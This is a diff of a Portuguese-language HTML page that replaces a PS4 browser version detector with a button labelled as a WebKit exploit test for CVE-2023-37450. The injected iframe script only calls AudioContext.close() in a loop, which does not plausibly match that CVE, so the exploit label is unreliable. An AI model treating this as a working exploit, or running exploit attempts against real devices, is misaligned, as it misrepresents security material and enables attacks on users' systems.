@@ -2,38 +2,50 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Detector de Versão</title>
+  <title>Teste PS4 WebKit</title>
   <style>
     body {
-      font-family: sans-serif;
-      padding: 2rem;
       background: #111;
       color: #0f0;
+      font-family: monospace;
+      padding: 2rem;
+      text-align: center;
     }
-    .info {
-      margin-top: 1rem;
+    button {
+      padding: 1rem 2rem;
+      font-size: 1.2rem;
+      background: #0f0;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0c0;
     }
   </style>
 </head>
 <body>
-  <h1>Verificador de Navegador PS4</h1>
-  <p class="info" id="output">Analisando...</p>
+  <h1>Detector de Navegador PS4</h1>
+  <p id="info">Clique no botão abaixo para executar o teste de WebKit (CVE-2023-37450).</p>
+
+  <button onclick="runExploitTest()">Executar Teste CVE-2023-37450</button>
 
   <script>
-    const output = document.getElementById('output');
-    const ua = navigator.userAgent;
+    function runExploitTest() {
+      document.getElementById("info").innerHTML = "Executando teste... aguarde.";
 
-    let message = `User Agent detectado:<br><code>${ua}</code><br><br>`;
-
-    if (ua.includes("PlayStation 4")) {
-      const match = ua.match(/PlayStation 4\/([\d.]+)/);
-      const version = match ? match[1] : "Desconhecida";
-      message += `Dispositivo: PS4<br>Versão do Navegador/Firmware: <strong>${version}</strong>`;
-    } else {
-      message += "Este não é um navegador do PS4.";
+      let iframe = document.createElement("iframe");
+      iframe.srcdoc = `<script>
+        let audio = new AudioContext();
+        for (let i = 0; i < 10000; i++) {
+          try {
+            audio.close();
+          } catch (e) {}
+        }
+      <\/script>`;
+      document.body.appendChild(iframe);
     }
-
-    output.innerHTML = message;
   </script>
 </body>
 </html>
